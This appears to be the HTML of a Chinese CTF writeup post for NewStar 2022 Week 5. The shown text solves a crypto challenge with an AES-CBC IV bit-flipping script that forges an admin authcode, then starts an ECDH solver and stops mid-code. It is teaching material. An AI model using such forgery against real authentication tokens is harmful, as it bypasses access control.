@@ -1,0 +1,1507 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>题解 - NewStar 2022 Week 5 - Cnily03 Home</title><meta name="Description" content="记录 2022 年 10 月 NewStar 新生赛 Week 5 的解题过程"><meta property="og:title" content="题解 - NewStar 2022 Week 5" />
+<meta property="og:description" content="记录 2022 年 10 月 NewStar 新生赛 Week 5 的解题过程" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://cnily.me/posts/ctf/wp/2022/newstar-week5/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-10-23T09:43:12+08:00" />
+<meta property="article:modified_time" content="2022-10-23T09:43:12+08:00" /><meta property="og:site_name" content="Cnily03 Home" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="题解 - NewStar 2022 Week 5"/>
+<meta name="twitter:description" content="记录 2022 年 10 月 NewStar 新生赛 Week 5 的解题过程"/>
+<meta name="application-name" content="Cnily03 Home">
+<meta name="apple-mobile-web-app-title" content="Cnily03 Home">
+
+<meta name="theme-color" content="#f8f8f8"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="https://cnily.me/posts/ctf/wp/2022/newstar-week5/" /><link rel="prev" href="https://cnily.me/posts/lifelong-bonus/" /><link rel="next" href="https://cnily.me/posts/wenyan/gushi-shuo/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "题解 - NewStar 2022 Week 5",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/cnily.me\/posts\/ctf\/wp\/2022\/newstar-week5\/"
+        },"genre": "posts","keywords": "CTF, Writeup","wordcount":  4659 ,
+        "url": "https:\/\/cnily.me\/posts\/ctf\/wp\/2022\/newstar-week5\/","datePublished": "2022-10-23T09:43:12+08:00","dateModified": "2022-10-23T09:43:12+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"authors": [{
+                        "@type": "Person",
+                        "name": "Cnily03"                    
+                    }],"description": "记录 2022 年 10 月 NewStar 新生赛 Week 5 的解题过程"
+    }
+    </script><link rel="stylesheet" href="https://cnily.me/v/css/common.css">
+        
+            <script type="text/javascript" src="https://cnily.me/v/js/title2tooltip.js" defer></script>
+        
+        
+            <script type="text/javascript" src="https://cnily.me/v/js/redirect.js"></script>
+        
+        
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark');}
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/"><span class="header-title-pre"><i class='cc cc-jw-bold' style='margin-right: .5rem'></i></span><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/series/"> 系列 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/window/"> 橱窗 </a><a class="menu-item" href="/friends/"> 友链 </a><a class="menu-item" href="https://b.cnily.me" title="语雀" rel="noopener noreferrer" target="_blank"><span id="renew-redirect"></span><b>语雀</b>  </a><a class="menu-item" href="https://github.com/Cnily03/cnily.me" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><a href="#" onclick="return false;" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" title="Select Language" id="language-select-desktop" onchange="location = this.value;"><option value="/en/posts/ctf/wp/2022/newstar-week5/">English</option><option value="/posts/ctf/wp/2022/newstar-week5/" selected>简体中文</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/"><span class="header-title-pre"><i class='cc cc-jw-bold' style='margin-right: .5rem'></i></span><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="#" onclick="return false;" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/series/" title="">系列</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/window/" title="">橱窗</a><a class="menu-item" href="/friends/" title="">友链</a><a class="menu-item" href="https://b.cnily.me" title="语雀" rel="noopener noreferrer" target="_blank"><span id="renew-redirect"></span><b>语雀</b></a><a class="menu-item" href="https://github.com/Cnily03/cnily.me" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="#" onclick="return false;" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" title="Select Language" onchange="location = this.value;"><option value="/en/posts/ctf/wp/2022/newstar-week5/">English</option><option value="/posts/ctf/wp/2022/newstar-week5/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container">
+        
+            <script type="text/javascript" src="https://cnily.me/third-parties/js/svg-inject.min.js"></script>
+        
+        
+<div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content always-active" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#crypto">CRYPTO</a>
+      <ul>
+        <li><a href="#flip-flop">flip-flop</a>
+          <ul>
+            <li><a href="#references">References</a></li>
+          </ul>
+        </li>
+        <li><a href="#an-der-schönen-elliptische-kurve">An der schönen Elliptische Kurve</a>
+          <ul>
+            <li><a href="#references-1">References</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#misc">MISC</a>
+      <ul>
+        <li><a href="#最后的流量分析">最后的流量分析</a></li>
+        <li><a href="#奇怪的-pdf">奇怪的 PDF</a></li>
+        <li><a href="#yesec-no-drumsticks-5">Yesec no drumsticks 5</a></li>
+      </ul>
+    </li>
+    <li><a href="#web">WEB</a>
+      <ul>
+        <li><a href="#give-me-your-photo-plz">Give me your photo PLZ</a></li>
+        <li><a href="#babyssti_three">BabySSTI_Three</a></li>
+        <li><a href="#so-baby-rce-again">So Baby RCE Again</a></li>
+        <li><a href="#unsafe-apache">Unsafe Apache</a>
+          <ul>
+            <li><a href="#cve-2021-41773">CVE-2021-41773</a></li>
+            <li><a href="#cve-2021-42013">CVE-2021-42013</a></li>
+            <li><a href="#路径穿越测试">路径穿越测试</a></li>
+            <li><a href="#rce-测试">RCE 测试</a></li>
+            <li><a href="#references-2">References</a></li>
+          </ul>
+        </li>
+        <li><a href="#find-round">Find round</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">题解 - NewStar 2022 Week 5</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class='author'><i class="author fas fa-user-circle fa-fw"></i><span class='screen-reader-text'>  </span><a href='https://cnily.me/authors/cnily03'>Cnily03</a></span>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a>&nbsp;<a href="/categories/writeup/"><i class="far fa-folder fa-fw"></i>Writeup</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-10-23">2022-10-23</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2022-10-23">2022-10-23</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 4659 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 10 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#crypto">CRYPTO</a>
+      <ul>
+        <li><a href="#flip-flop">flip-flop</a>
+          <ul>
+            <li><a href="#references">References</a></li>
+          </ul>
+        </li>
+        <li><a href="#an-der-schönen-elliptische-kurve">An der schönen Elliptische Kurve</a>
+          <ul>
+            <li><a href="#references-1">References</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#misc">MISC</a>
+      <ul>
+        <li><a href="#最后的流量分析">最后的流量分析</a></li>
+        <li><a href="#奇怪的-pdf">奇怪的 PDF</a></li>
+        <li><a href="#yesec-no-drumsticks-5">Yesec no drumsticks 5</a></li>
+      </ul>
+    </li>
+    <li><a href="#web">WEB</a>
+      <ul>
+        <li><a href="#give-me-your-photo-plz">Give me your photo PLZ</a></li>
+        <li><a href="#babyssti_three">BabySSTI_Three</a></li>
+        <li><a href="#so-baby-rce-again">So Baby RCE Again</a></li>
+        <li><a href="#unsafe-apache">Unsafe Apache</a>
+          <ul>
+            <li><a href="#cve-2021-41773">CVE-2021-41773</a></li>
+            <li><a href="#cve-2021-42013">CVE-2021-42013</a></li>
+            <li><a href="#路径穿越测试">路径穿越测试</a></li>
+            <li><a href="#rce-测试">RCE 测试</a></li>
+            <li><a href="#references-2">References</a></li>
+          </ul>
+        </li>
+        <li><a href="#find-round">Find round</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="pre-content"></div><div class="content" id="content"><h2 id="crypto" class="headerLink">
+    <a href="#crypto" class="header-mark"></a>CRYPTO</h2><h3 id="flip-flop" class="headerLink">
+    <a href="#flip-flop" class="header-mark"></a>flip-flop</h3><p>题目中的关键代码如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 生成 authcode</span>
+</span></span><span class="line"><span class="cl"><span class="n">auth_pt</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;NewStarCTFer____&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">user_key</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">auth_major_key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">user_key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">code</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">auth_pt</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;here is your authcode: </span><span class="si">{</span><span class="n">user_key</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span> <span class="o">+</span> <span class="n">code</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 解码 authcode</span>
+</span></span><span class="line"><span class="cl"><span class="n">user_key</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">authcode</span><span class="p">)[:</span><span class="mi">16</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">code</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">authcode</span><span class="p">)[</span><span class="mi">16</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">auth_major_key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">user_key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">auth_pt</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">auth_pt</span> <span class="o">==</span> <span class="s1">&#39;AdminAdmin______&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">FLAG</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们要使解码后的 <code>auth_pt</code> 为 <code>AdminAdmin______</code>.</p>
+<p>我们已知密文 <code>cipher = code</code>, 初始向量 <code>iv = user_key</code> 和明文 <code>plain = b'NewStarCTFer____'</code>. 可以考虑字节翻转攻击。</p>
+<p>首先我们回顾一下 AES-CBC 加密流程：</p>
+<img
+        
+        loading="lazy"
+        src="https://image.cnily.top/v/crypto/AES_CBC_encryption.svg"
+        srcset="https://image.cnily.top/v/crypto/AES_CBC_encryption.svg, https://image.cnily.top/v/crypto/AES_CBC_encryption.svg 1.5x, https://image.cnily.top/v/crypto/AES_CBC_encryption.svg 2x"
+        sizes="auto"
+        alt="https://image.cnily.top/v/crypto/AES_CBC_encryption.svg"onload="SVGInject(this);this.style.maxWidth=/[a-zA-Z]+/.test('675')?'675':'675px';this.style.display='block';this.style.margin='auto';this.style.width='100%'"title="">
+<p>相应的解密流程为：</p>
+<img
+        
+        loading="lazy"
+        src="https://image.cnily.top/v/crypto/AES_CBC_decryption.svg"
+        srcset="https://image.cnily.top/v/crypto/AES_CBC_decryption.svg, https://image.cnily.top/v/crypto/AES_CBC_decryption.svg 1.5x, https://image.cnily.top/v/crypto/AES_CBC_decryption.svg 2x"
+        sizes="auto"
+        alt="https://image.cnily.top/v/crypto/AES_CBC_decryption.svg"onload="SVGInject(this);this.style.maxWidth=/[a-zA-Z]+/.test('675')?'675':'675px';this.style.display='block';this.style.margin='auto';this.style.width='100%'"title="">
+<p>我们发现，可以通过仅改变上一组的 Ciphertext 的值来改变 Plaintext 相应位置的值，第一组 Plaintext 则可以通过改变 IV 来改变。如下图：</p>
+<img
+        
+        loading="lazy"
+        src="https://image.cnily.top/v/crypto/AES_CBC_modification_attack.svg"
+        srcset="https://image.cnily.top/v/crypto/AES_CBC_modification_attack.svg, https://image.cnily.top/v/crypto/AES_CBC_modification_attack.svg 1.5x, https://image.cnily.top/v/crypto/AES_CBC_modification_attack.svg 2x"
+        sizes="auto"
+        alt="https://image.cnily.top/v/crypto/AES_CBC_modification_attack.svg"onload="SVGInject(this);this.style.maxWidth=/[a-zA-Z]+/.test('675')?'675':'675px';this.style.display='block';this.style.margin='auto';this.style.width='100%'"title="">
+<p>Plaintext 每一位的运算法则为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">cipher</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">plain</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中 <code>key[i]</code> 是固定不变但未知的，根据异或的运算法则，我们可以得到：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">cipher_ori</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">plain_ori</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">cipher_new</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">plain_new</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">plain_new</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">cipher_ori</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">plain_ori</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>题目中的加密解密数据刚好为 16 个字节，即一组，所以只需要改变 IV 即可。</p>
+<p>由此可以计算出新的 <code>authcode</code>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># https://www.jianshu.com/p/476b595e9594</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+</span></span><span class="line"><span class="cl"><span class="n">auth_major_key</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># nc 获取一个 authcode</span>
+</span></span><span class="line"><span class="cl"><span class="n">authcode</span> <span class="o">=</span> <span class="s2">&#34;8e287f0d9daf5ade6e7663c51274b150ae6eb996895ab44bf915a884b19933c4&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">iv</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">authcode</span><span class="p">)[:</span><span class="mi">16</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">ciphertext</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">authcode</span><span class="p">)[</span><span class="mi">16</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl"><span class="n">plain</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;NewStarCTFer____&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">expected_plain</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;AdminAdmin______&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">iv</span> <span class="o">=</span> <span class="n">iv</span><span class="p">[:</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">iv</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">plain</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">expected_plain</span><span class="p">[</span><span class="n">i</span><span class="p">]])</span> <span class="o">+</span> <span class="n">iv</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">hacked_authcode</span> <span class="o">=</span> <span class="n">iv</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span> <span class="o">+</span> <span class="n">ciphertext</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">hacked_authcode</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到解密可以生成 <code>b&quot;AdminAdmin______&quot;</code> 的 <code>authcode</code>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">81296537878f4cf0535e59e81274b150ae6eb996895ab44bf915a884b19933c4
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到 flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">flag{filp_the_word!!!!!!!!}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="references" class="headerLink">
+    <a href="#references" class="header-mark"></a>References</h4><ul>
+<li><a href="https://www.jianshu.com/p/476b595e9594" target="_blank" rel="noopener noreferrer">https://www.jianshu.com/p/476b595e9594</a></li>
+</ul>
+<h3 id="an-der-schönen-elliptische-kurve" class="headerLink">
+    <a href="#an-der-sch%c3%b6nen-elliptische-kurve" class="header-mark"></a>An der schönen Elliptische Kurve</h3><p>题目给了一个 <code>.sage</code> 文件，内部语法格式为 <code>python</code>，需要安装 <a href="https://mirrors.aliyun.com/sagemath/win/index.html" target="_blank" rel="noopener noreferrer">sagemath</a>. 可以参照<a href="https://zhuanlan.zhihu.com/p/297736314" target="_blank" rel="noopener noreferrer">此篇文章</a>配置 sagemath 在 Jupyter 中的运行环境。</p>
+<p>根据标题和题目所给文件可以分析出，该题考察椭圆曲线的笛福赫尔曼算法的变种 ECDH.</p>
+<p>ECDH 需要解决的问题大致是：Alice 和 Bob 想要安全通信，中间人可能会窃听消息，但是没办法解密消息。</p>
+<p>在此之前需要了解椭圆曲线。</p>
+<p>椭圆曲线是指由韦尔斯特拉（Weierastrass）方程 $$ {\rm E}: y^2 + ax y +by = x^3 + cx^2 + dx + e $$ 所确定的平面曲线。</p>
+<p>在密码学中，常采用下列形式的椭圆曲线：
+$$ {\rm E}: y^2 = x^3 + ax + b $$
+并要求 $$ 4a^3 + 27b^2 \not = 0 $$</p>
+<p>有限域 ${\rm GF}(p)$ 上的椭圆曲线表示式为
+$$ y^2 \equiv x^3 + ax + b \pmod{p} $$
+且满足 $$ 4a^3 + 27b^2 \pmod{p} \not = 0 $$</p>
+<p>ECDH 中，$G$ 表示在同一个有限域上选择的用于生成子群的一个基点。ECDH 算法的流程大致如下：</p>
+<ol>
+<li>Alice 和 Bob 生成各自的私钥 $d_A$ 和 $d_B$，并计算出各自的公钥
+ $$
+   H_A = d_A G \\
+   H_B = d_B G
+   $$ </li>
+<li>Alice 和 Bob 通过不安全信道（如互联网）交换各自的公钥。</li>
+<li>Alice 计算 $S = d_A H_B$，Bob 计算 $S = d_B H_A$. 显然他们计算得到的 $S$ 是一样的，这是因为
+$$ S = d_A H_B = d_A d_B G = d_B d_A G = d_B H_A $$</li>
+</ol>
+<p>注意，在上述过程中，Alice 只持有自己的私钥 $d_A$ 并保密，Bob 只持有自己的私钥 $d_B$ 并保密，而 $G$ 和公钥信息都是可以公开（或是说被窃听）的。</p>
+<p>回到本题，阅读代码，根据题目所给的数字，我们只需要求出 <code>shared</code> 再计算出 <code>key</code> 即可完成 AES 的解密。代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="mi">14489</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="mi">10289</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="mi">7486573182795736771889604737751889118967735916352298289975055815020934891723453392369540853603360270847848895677903334441530052977221688450741083448029661</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">F</span> <span class="o">=</span> <span class="n">GF</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">E</span> <span class="o">=</span> <span class="n">EllipticCurve</span><span class="p">(</span><span class="n">F</span><span class="p">,</span> <span class="p">[</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">])</span>
